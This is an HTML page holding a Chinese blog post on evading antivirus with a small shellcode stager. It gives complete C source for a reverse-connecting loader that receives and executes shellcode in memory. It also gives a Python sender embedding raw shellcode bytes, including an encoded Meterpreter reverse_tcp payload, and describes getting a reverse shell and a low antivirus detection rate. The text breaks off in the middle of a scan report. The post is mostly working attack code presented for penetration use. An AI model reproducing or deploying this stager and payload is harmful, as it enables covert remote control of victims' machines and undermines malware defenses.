@@ -1,0 +1,279 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<!--
+//                            _ooOoo_
+//                           o8888888o
+//                           88" . "88
+//                           (| -_- |)
+//                            O\ = /O
+//                        ____/`---'\____
+//                      .   ' \\| |// `.
+//                       / \\||| : |||// \
+//                     / _||||| -:- |||||- \
+//                       | | \\\ - /// | |
+//                     | \_| ''\---/'' | |
+//                      \ .-\__ `-` ___/-. /
+//                   ___`. .' /--.--\ `. . __
+//                ."" '< `.___\_<|>_/___.' >'"".
+//               | | : `- \`.;`\ _ /`;.`/ - ` : | |
+//                 \ \ `-. \_ __\ /__ _/ .-` / /
+//         ======`-.____`-.___\_____/___.-`____.-'======
+//                            `=---='
+//                 拦截插件累计拦截逗比攻击"1381438"次！
+//         .............................................
+//                  佛祖保佑             永无BUG
+//          佛曰:
+//                  写字楼里写字间，写字间里程序员；
+//                  程序人员写程序，又拿程序换酒钱。
+//                  酒醒只在网上坐，酒醉还来网下眠；
+//                  酒醉酒醒日复日，网上网下年复年。
+//                  但愿老死电脑间，不愿鞠躬老板前；
+//                  奔驰宝马贵者趣，公交自行程序员。
+//                  别人笑我忒疯癫，我笑自己命太贱；
+//                  不见满街漂亮妹，哪个归得程序员？
+-->
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://github.com/hucmosin/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://github.com/hucmosin">
+<meta name="author" content="Mosin">
+<link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/SimpleStyle.min.css">
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>shellcode的另类使用方式 - Mosin&#39; Blog</title>
+
+<meta name="keywords" content="Shellcode">
+
+<meta name="description " content="Learning, summarizing, thinking, feeling and knowledge management">
+</head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="聊">聊</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-weixin-mp" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">Mosin&#39;s Blog</h1>
+        <h3 class="cover-siteTitle">聊技术，谈情怀</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+            <div class="btn btn-github">
+                <a href="https://github.com/hucmosin" target="_blank" title="github" ref="friend">
+                    <i class="fa fa-github"></i>
+                </a>
+            </div>
+            
+        </div>
+    </div>
+</div>
+            <div class="page-title">
+    <ul>
+        <li><a href="/">最新</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/code-audit" data-name="审计">审计</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/technology" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-share" data-name="分享">分享</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/study-note" data-name="学习">学习</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/others-end" data-name="其他">其他</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <label for="s" class="sr-only">Input Search key Words Here</label>
+        <input class="search-field" type="text" name="s" class="text" placeholder="Input Search key Words Here" />
+        <button type="submit" class="search-form-submit" title="Search"><i class="fa fa-search"></i></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input"  placeholder="请输入关键字"/>   <!-- placeholder="Type something..."/>-->
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://github.com/hucmosin" target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">作者</span>
+                    <a href="https://github.com/hucmosin" target="_blank">mosin</a>
+                    <span title="最后编辑于2017-10-22">2017-10-22</span>
+                </p>
+                <p>灵魂无处安放,所以选择流浪</p>
+            </div>
+            <h2 class="post-title">Shellcode的另类使用方式</h2>
+            <div class="post-meta">
+                本文总共13492个字 | 您是第<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>位看到它们的小伙伴
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p><code>shellcode</code>是我们在做渗透或者进行漏洞利用时常用的一段代码,它能够以很小的字节数完成我们想要的结果,然而现在杀毒软件的识别能力也在加强，所以迫使我们要对<code>shellcode</code>进行加密混淆等等操作达到免杀的目的,怎么能够减少<code>shellcode</code>被杀的概率呢？下面我来介绍一种比较另类的利用方式。</p>
+<h3 id="0x01-科普"><a href="#0x01-科普" class="headerlink" title="0x01 科普"></a>0x01 科普</h3><p>搞Web安全的都知道，我们在渗透一个网站的时候,往往需要用到大马和小马。比如一个上传漏洞,如果漏洞上传点限制了文件大小，而我们又无法进行绕过时，那么就需要用到小马,利用小马进行无限制大小的上传我们的大马,从而进一步的控制服务器和利用大马进行提权。</p>
+<p>道理一样，我们利用<code>Shellcode</code>进行渗透时,如果服务器安装有杀毒软件,我们没有经过免杀操作的<code>Shellcode</code>就不能在服务器上运行,进而我们需要对<code>Shellcode</code>进行繁琐的免杀操作,所以，受到<code>web</code>端启发,我们可不可以在无法过杀毒软件的情况下上传一个无害的小马呢？答案是可以的。</p>
+<h3 id="0x02-小马监听端"><a href="#0x02-小马监听端" class="headerlink" title="0x02 小马监听端"></a>0x02 小马监听端</h3><p>测试环境：</p>
+<blockquote>
+<p>1.本机win7 : 127.0.0.1（本机作为攻击机和被攻击机）</p>
+<p>2.虚拟机kali : 192.168.19.128（shell监听）</p>
+</blockquote>
+<p>首先我们利用<code>recver_hander</code>模块生成反弹监听小马</p>
+<p><img src="/allimage/shellcodel/图片1.jpg" alt="图片1"></p>
+<p><img src="/allimage/shellcodel/图片2.jpg" alt="图片2"></p>
+<p><img src="/allimage/shellcodel/图片3.jpg" alt="图片3"></p>
+<p>我们打开<code>temp.cpp</code>查看小马源码</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">//Project : https://github.com/hucmosin/purelove</span><br><span class="line">//This file created with purelove ..</span><br><span class="line">//Compile : gcc temp.c -o test.exe</span><br><span class="line"></span><br><span class="line">    #include &lt;stdio.h&gt;                      </span><br><span class="line">    #include &lt;winsock2.h&gt;                  </span><br><span class="line">    #include &lt;Windows.h&gt;              </span><br><span class="line">    #pragma comment (lib, &quot;ws2_32&quot;)        </span><br><span class="line">    typedef struct sockaddr_in sockaddr_in;</span><br><span class="line">    </span><br><span class="line">    int sock_shellcode(char *shellcodes)</span><br><span class="line">    &#123;</span><br><span class="line">            char *shellcode =shellcodes;</span><br><span class="line">            DWORD why_must_this_variable;</span><br><span class="line">            BOOL ret = VirtualProtect (shellcode, strlen(shellcode),</span><br><span class="line">            PAGE_EXECUTE_READWRITE, &amp;why_must_this_variable);</span><br><span class="line">            if (!ret) &#123;</span><br><span class="line">                    return 0;</span><br><span class="line">            &#125;</span><br><span class="line">            ((void (*)(void))shellcode)();</span><br><span class="line">            return 0;</span><br><span class="line">    &#125;	</span><br><span class="line">    int main()</span><br><span class="line">    &#123;</span><br><span class="line">        Sleep(2000);                   </span><br><span class="line">        WSADATA wsaData;</span><br><span class="line">        WSAStartup(MAKEWORD(2, 2), &amp;wsaData);</span><br><span class="line">        SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">        sockaddr_in sockaddr;</span><br><span class="line">        sockaddr.sin_family=AF_INET;</span><br><span class="line">        sockaddr.sin_port=htons(4444);</span><br><span class="line">        sockaddr.sin_addr.S_un.S_addr=inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">        connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR));</span><br><span class="line">            printf(&quot;SERVER&quot;); </span><br><span class="line">            while(TRUE)</span><br><span class="line">            &#123;</span><br><span class="line">                    while(TRUE)</span><br><span class="line">                    &#123;</span><br><span class="line">                            char buffer[4096];</span><br><span class="line">                            recv(s, buffer, 4096, NULL);</span><br><span class="line">                            if (buffer == NULL)</span><br><span class="line">                            &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                            &#125;</span><br><span class="line">                            else </span><br><span class="line">                            &#123;</span><br><span class="line">                            sock_shellcode(buffer);</span><br><span class="line">                            &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        printf(&quot;thins end up&quot;);</span><br><span class="line">        closesocket(s);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        getchar();</span><br><span class="line">        exit(0);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这个小马，利用了反向连接监听方法，首先我们创建<code>SOCKET</code>套接字，设置远程连接端口和IP地址，这里就用本机进行演示，连接远程<code>IP：127.0.0.1</code>，远程端口<code>4444</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SOCKET s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">sockaddr_in sockaddr;</span><br><span class="line">sockaddr.sin_family=AF_INET;</span><br><span class="line">sockaddr.sin_port=htons(4444);</span><br><span class="line">sockaddr.sin_addr.S_un.S_addr=inet_addr(&quot;127.0.0.1&quot;);</span><br><span class="line">connect(s, (SOCKADDR*)&amp;sockaddr, sizeof(SOCKADDR));</span><br></pre></td></tr></table></figure>
+<p>我们写一个死循环来监听远程发送过来的<code>Shellocde</code>,这里的数据内存要写<code>4096</code>,否则小马会因为接收的数据太大而退出，如果你的<code>shellcode</code>很大，建议对数据进行打包发送和接收，当然还有异常处理什么的这里就不写了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">while(TRUE)</span><br><span class="line">&#123;</span><br><span class="line">    while(TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">      char buffer[4096];</span><br><span class="line">      recv(s, buffer, 4096, NULL);</span><br><span class="line">      if (buffer == NULL)</span><br><span class="line">      &#123;</span><br><span class="line">         continue;</span><br><span class="line">       &#125;</span><br><span class="line">      else </span><br><span class="line">       &#123;</span><br><span class="line">         sock_shellcode(buffer); //shellcode接收执行</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>下面来到<code>shellcode</code>执行部分,我们设置一个<code>shellcode</code>执行函数<code>sock_shellcode()</code>,我们用一个函数来进行内存保护<code>VirtualProtect()</code>,最后执行<code>shellcode</code>,<code>((void (*)(void))shellcode)()</code>;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int sock_shellcode(char *shellcodes)</span><br><span class="line">   &#123;</span><br><span class="line">           char *shellcode =shellcodes;</span><br><span class="line">           DWORD test;</span><br><span class="line">           BOOL ret = VirtualProtect (shellcode, strlen(shellcode),</span><br><span class="line">           PAGE_EXECUTE_READWRITE, &amp;test);</span><br><span class="line">           if (!ret) &#123;</span><br><span class="line">                   return 0;</span><br><span class="line">           &#125;</span><br><span class="line">           ((void (*)(void))shellcode)();</span><br><span class="line">           return 0;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-Shellcode发送端"><a href="#0x03-Shellcode发送端" class="headerlink" title="0x03 Shellcode发送端"></a>0x03 Shellcode发送端</h3><p>小马写好了，那么我们来写<code>shellcode</code>发送监听端，<code>shellcode</code>发送监听端我们采用python来写（什么语言无所谓）。</p>
+<p> 图</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line">import os,sys</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">HOST   = &apos;0.0.0.0&apos;</span><br><span class="line">PORT   = 4444</span><br><span class="line">BUFSIZ = 2048</span><br><span class="line">ADDR   = (HOST, PORT)</span><br><span class="line">sock   = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">sock.bind(ADDR)</span><br><span class="line">sock.listen(1)</span><br><span class="line">STOP_CHAT = False</span><br><span class="line"></span><br><span class="line">print &quot;Hander Listening %s port:%s&quot; %(HOST,PORT)</span><br><span class="line">while not STOP_CHAT:</span><br><span class="line">    tcpClientSock, addr=sock.accept()</span><br><span class="line">    print(&apos;Start Listening %s  port %s.....&apos;) %(addr,PORT)</span><br><span class="line">    while True:</span><br><span class="line">        p = raw_input(&quot;send:&gt; &quot;)</span><br><span class="line">        if p ==&quot;send&quot;:</span><br><span class="line">           data = &quot;&quot; #shellcode存放</span><br><span class="line">        try:</span><br><span class="line">            tcpClientSock.send(data)</span><br><span class="line">            if data.upper()==&quot;QUIT&quot;:</span><br><span class="line">                STOP_CHAT = True</span><br><span class="line">                break</span><br><span class="line">            os_result = tcpClientSock.recv(BUFSIZ)</span><br><span class="line">        except:</span><br><span class="line">            tcpClientSock.close()</span><br><span class="line">            break</span><br><span class="line">        if STOP_CHAT:</span><br><span class="line">            break</span><br><span class="line">        print(os_result)</span><br><span class="line"></span><br><span class="line">tcpClientSock.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<p>我们一样，用一个<code>socket</code>套接字来监听<code>4444</code>端口，<code>data</code>变量用来存放<code>shellcode</code>,当然这里的<code>shellcode</code>过大，也需要对<code>shellcode</code>进行打包发送。</p>
+<p>到了这一步，我们的小马和服务监听端就写好了。</p>
+<h3 id="0x04-Shellcode利用"><a href="#0x04-Shellcode利用" class="headerlink" title="0x04 Shellcode利用"></a>0x04 Shellcode利用</h3><p>我们现在来测试一下，我们先使用<code>messagebox</code>模块生成<code>shellcode</code>,弹出的<code>messagebox</code>信息为<code>”test”</code>。</p>
+<p><img src="/allimage/shellcodel/图片4.jpg" alt="图片4"></p>
+<p>我们把<code>shellcode</code>复制到<code>shellcode</code>发送端里的<code>data</code>变量中，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import os,sys</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">HOST   = &apos;0.0.0.0&apos;</span><br><span class="line">PORT   = 4444</span><br><span class="line">BUFSIZ = 2048</span><br><span class="line">ADDR   = (HOST, PORT)</span><br><span class="line">sock   = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">sock.bind(ADDR)</span><br><span class="line">sock.listen(1)</span><br><span class="line">STOP_CHAT = False</span><br><span class="line"></span><br><span class="line">print &quot;Hander Listening %s port:%s&quot; %(HOST,PORT)</span><br><span class="line">while not STOP_CHAT:</span><br><span class="line">    tcpClientSock, addr=sock.accept()</span><br><span class="line">    print(&apos;Start Listening %s  port %s.....&apos;) %(addr,PORT)</span><br><span class="line">    while True:</span><br><span class="line">        p = raw_input(&quot;send:&gt; &quot;)</span><br><span class="line">        if p ==&quot;send&quot;:</span><br><span class="line">            data= &quot;\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68\x54\x53\x45\x54\x8b\xcc\x57\x57\x51\x57\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd6\x57\xff\xd0&quot;</span><br><span class="line">        try:</span><br><span class="line">            tcpClientSock.send(data)</span><br><span class="line">            if data.upper()==&quot;QUIT&quot;:</span><br><span class="line">                STOP_CHAT = True</span><br><span class="line">                break</span><br><span class="line">            os_result = tcpClientSock.recv(BUFSIZ)</span><br><span class="line">        except:</span><br><span class="line">            tcpClientSock.close()</span><br><span class="line">            break</span><br><span class="line">        if STOP_CHAT:</span><br><span class="line">            break</span><br><span class="line">        print(os_result)</span><br><span class="line"></span><br><span class="line">tcpClientSock.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<p>现在我们执行小马程序，对<code>shellcode</code>发送端进行连接，在连接成功后我们<code>send</code>发送<code>shellcode</code></p>
+<p><img src="/allimage/shellcodel/图片6.jpg" alt="图片6"></p>
+<p>可以看到成功了！说明我们的小马程序没有任何的问题。在日常中，我们习惯使用<code>metaspliot</code>来进行攻击，那么我们就用<code>metaspliot</code>的<code>payload</code>来进行利用。</p>
+<p>下面我们选择<code>reverse_tcp</code>模块生成<code>shellcode</code>编码。</p>
+<p><img src="/allimage/shellcodel/图片7.jpg" alt="图片7"></p>
+<p>同理，我们把<code>shellcode</code>放到<code>shellcode</code>发送端里的<code>data</code>变量中，如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">#-- coding: utf-8 --</span><br><span class="line"></span><br><span class="line">import os,sys</span><br><span class="line">from socket import *</span><br><span class="line"></span><br><span class="line">HOST   = &apos;0.0.0.0&apos;</span><br><span class="line">PORT   = 4444</span><br><span class="line">BUFSIZ = 2048</span><br><span class="line">ADDR   = (HOST, PORT)</span><br><span class="line">sock   = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">sock.bind(ADDR)</span><br><span class="line">sock.listen(1)</span><br><span class="line">STOP_CHAT = False</span><br><span class="line"></span><br><span class="line">print &quot;Hander Listening %s port:%s&quot; %(HOST,PORT)</span><br><span class="line">while not STOP_CHAT:</span><br><span class="line">    tcpClientSock, addr=sock.accept()</span><br><span class="line">    print(&apos;Start Listening %s  port %s.....&apos;) %(addr,PORT)</span><br><span class="line">    while True:</span><br><span class="line">        p = raw_input(&quot;send:&gt; &quot;)</span><br><span class="line">        if p ==&quot;send&quot;:</span><br><span class="line">            data= &quot;\xeb\x18\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb\x03\x74\x0e\x80\xf3\x05\x88\x1f\x47\x40\xeb\xef\xe8\xe3\xff\xff\xff\xf9\xed\x83\x05\x05\x05\x65\x8c\xe0\x34\xd7\x61\x8e\x57\x35\x8e\x57\x09\x8e\x57\x11\x8e\x77\x2d\x0a\xb2\x4f\x23\x34\xfa\x34\xc5\xa9\x39\x64\x79\x07\x29\x25\xc4\xca\x08\x04\xc2\xe7\xf5\x57\x52\x8e\x57\x15\x8e\x47\x39\x8e\x49\x15\x7d\xe6\x4f\x04\xd4\x54\x8e\x5c\x25\x04\xd6\x8e\x4c\x1d\xe6\x39\x4c\x8e\x31\x8e\x04\xd3\x34\xfa\x34\xc5\xa9\xc4\xca\x08\x04\xc2\x3d\xe5\x70\xf1\x06\x78\xfd\x3e\x78\x21\x70\xe7\x5d\x8e\x5d\x21\x04\xd6\x63\x8e\x09\x4e\x8e\x5d\x19\x04\xd6\x8e\x01\x8e\x04\xd5\x8c\x41\x21\x21\x5e\x5e\x64\x5c\x5f\x54\xfa\xe5\x5d\x5a\x5f\x8e\x17\xee\x8c\x58\x6d\x36\x37\x05\x05\x6d\x72\x76\x37\x5a\x51\x6d\x49\x72\x23\x02\xfa\xd0\xbd\x95\x04\x05\x05\x2c\xc1\x51\x55\x6d\x2c\x85\x6e\x05\xfa\xd0\x55\x55\x55\x55\x45\x55\x45\x55\x6d\xef\x0a\xda\xe5\xfa\xd0\x92\x6f\x0c\x6d\xc5\xad\x16\x85\x6d\x07\x05\x14\x59\x8c\xe3\x6f\x15\x53\x52\x6d\x9c\xa0\x71\x64\xfa\xd0\x80\xc5\x71\x09\xfa\x4b\x0d\x70\xe9\x6d\xf5\xb0\xa7\x53\xfa\xd0\x6f\x05\x6f\x01\x53\x52\x6d\x07\xdc\xcd\x5a\xfa\xd0\x8e\x33\x6f\x45\x6d\x05\x15\x05\x05\x53\x6f\x05\x6d\x5d\xa1\x56\xe0\xfa\xd0\x96\x56\x6f\x05\x53\x56\x52\x6d\x07\xdc\xcd\x5a\xfa\xd0\x04\xc6\x2c\xc3\x80\xf3\x70\xe9\xc6\x03&quot;</span><br><span class="line">        try:</span><br><span class="line">            tcpClientSock.send(data)</span><br><span class="line">            if data.upper()==&quot;QUIT&quot;:</span><br><span class="line">                STOP_CHAT = True</span><br><span class="line">                break</span><br><span class="line">            os_result = tcpClientSock.recv(BUFSIZ)</span><br><span class="line">        except:</span><br><span class="line">            tcpClientSock.close()</span><br><span class="line">            break</span><br><span class="line">        if STOP_CHAT:</span><br><span class="line">            break</span><br><span class="line">        print(os_result)</span><br><span class="line"></span><br><span class="line">tcpClientSock.close()</span><br><span class="line">sock.close()</span><br></pre></td></tr></table></figure>
+<p>对<code>shellcode</code>发送端进行反向连接，连接成功后，我们<code>send</code>发送<code>shellcode</code>到小马端进行执行。</p>
+<p>我们用<code>metaspliot</code>的<code>handler</code>进行监听，我们使用的模块是<code>payload/windows/meterpreter/reverse_tcp</code>。</p>
+<p><img src="/allimage/shellcodel/图片8.jpg" alt="图片8"></p>
+<p>可以看到，在我们<code>send</code>发送<code>shellcode</code>后，成功在<code>kali</code>里获取到了反弹<code>shell</code>。</p>
+<p>现在为了验证小马的过杀软能力，把小马上传到<code>virscan</code>进行杀毒引擎病毒扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">Virginian.org Scanned Report :</span><br><span class="line">Scanned time   : 2017-09-17 17:59:56</span><br><span class="line">Scanner results: 5%的杀软(2/39)报告发现病毒</span><br><span class="line">File Name      : test.exe</span><br><span class="line">File Size      : 17988 byte</span><br><span class="line">File Type      : application/x-dosexec</span><br><span class="line">MD5            : 2e6a1aef8517d9e6e5291fc2725dbd09</span><br><span class="line">SHA1           : ba9b1897f74f05791da16615fbf22ee1f052f6e0</span><br><span class="line">Online report  : http://r.virscan.org/report/488a9535a7294fc51f0148f237f47c02</span><br><span class="line"></span><br><span class="line">Scanner        Engine Ver      Sig Ver           Sig Date    Time   Scan 